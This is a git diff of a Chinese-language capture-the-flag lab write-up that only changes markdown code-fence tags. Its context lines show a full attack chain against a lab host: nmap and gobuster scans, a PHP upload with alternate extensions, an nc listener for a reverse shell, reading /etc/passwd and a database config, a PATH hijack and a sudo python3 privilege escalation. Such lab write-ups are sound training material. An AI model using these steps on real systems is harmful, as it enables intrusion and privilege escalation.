@@ -14,7 +14,7 @@ tags:
 
 ## 主机发现
 
-```
+```bash
 sudo nmap -sn 10.10.10.0/24
 ```
 
@@ -27,7 +27,7 @@ sudo nmap -sn 10.10.10.0/24
 使用 nmap 对靶机进行扫描，寻找靶机开放的端口以便于进行更进一步的渗透测试
 
 扫描开放的端口
-```
+```bash
 sudo nmap --min-rate 10000 -p- 10.10.10.9
 ```
 
@@ -41,7 +41,7 @@ sudo nmap -sT -sC -sV -p22,80 10.10.10.9 -oA nmap/Scan
 ![ccc](ccc.png)
 
 使用 nmap 进行默认的漏洞脚本扫描，并将结果保存到本地
-```
+```bash
 sudo nmap --script=vuln -p22,80 10.10.10.9 -oA nmap/Script
 ```
 
@@ -49,7 +49,7 @@ sudo nmap --script=vuln -p22,80 10.10.10.9 -oA nmap/Script
 
 发现暴露出了很多目录，执行一下完整的目录爆破
 
-```
+```bash
 sudo gobuster dir -u /usr/share/dirb/wordlists/common.txt 
 ```
 
@@ -80,7 +80,7 @@ View Details 点击没反应，
 
 如图随便输入注册一个账号试试
 
-```
+```bash
 admin12345
 admin12345@gmail
 admin12345
@@ -125,7 +125,7 @@ id=1 或 0 极有可能是 root 或 拥有 root 权限
 尝试使用罕见的后缀名上传文件，
 以下是可能的 后缀名
 
-```
+```shell
 .php
 .php3
 .php4
@@ -154,7 +154,7 @@ id=1 或 0 极有可能是 root 或 拥有 root 权限
 
 kali 建立 nc 监听
 
-```
+```bash
 sudo nc -lvnp 4444
 ```
 
@@ -164,7 +164,7 @@ sudo nc -lvnp 4444
 
 使用 python3 获得更好的 shell 环境
 
-```
+```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
@@ -176,13 +176,13 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 ![rrr](rrr.png)
 
-```
+```bash
 find / -name database.php
 ```
 
 ![sss](sss.png)
 
-```
+```bash
 cd /var/www/html/config/
 ls
 cat database.php
@@ -195,7 +195,7 @@ cat database.php
 查看一下 shadow 或者 passwd 的执行权限，
 shadow 没有任何权限，passwd 有读取的权限，
 
-```
+```bash
 ls -liah /etc/passwd
 ```
 
@@ -203,7 +203,7 @@ ls -liah /etc/passwd
 
 读取一下，提取出拥有 /bin/bash 的用户
 
-```
+```bash
 cat /etc/passwd | grep "/bin/bash"
 ```
 
@@ -211,7 +211,7 @@ cat /etc/passwd | grep "/bin/bash"
 
 查看具有 s 位的可执行文件
 
-```
+```bash
 find / -perm -u=s -type f 2>/dev/null
 ```
 
@@ -225,7 +225,7 @@ find / -perm -u=s -type f 2>/dev/null
 
 尝试一下在执行 toto 之前塞一个 /bin/bash 到环境变量切换到 john 用户
 
-```
+```bash
 echo "/bin/bash" > /tmp/cdt
 chmod 777 /tmp/cdt
 echo $PATH
@@ -240,7 +240,7 @@ echo $PATH
 
 进入 john 用户文件夹
 
-```
+```bash
 cd ../../../../../../../home/john
 ```
 
@@ -259,7 +259,7 @@ john 的密码是 root123，
 
 塞一个切换 bash 的命令 给 file.py 实现提权
 
-```
+```bash
 echo "import pty;pty.spawn('/bin/bash')" > file.py
 cat file.py
 sudo python3 /home/john/file.py
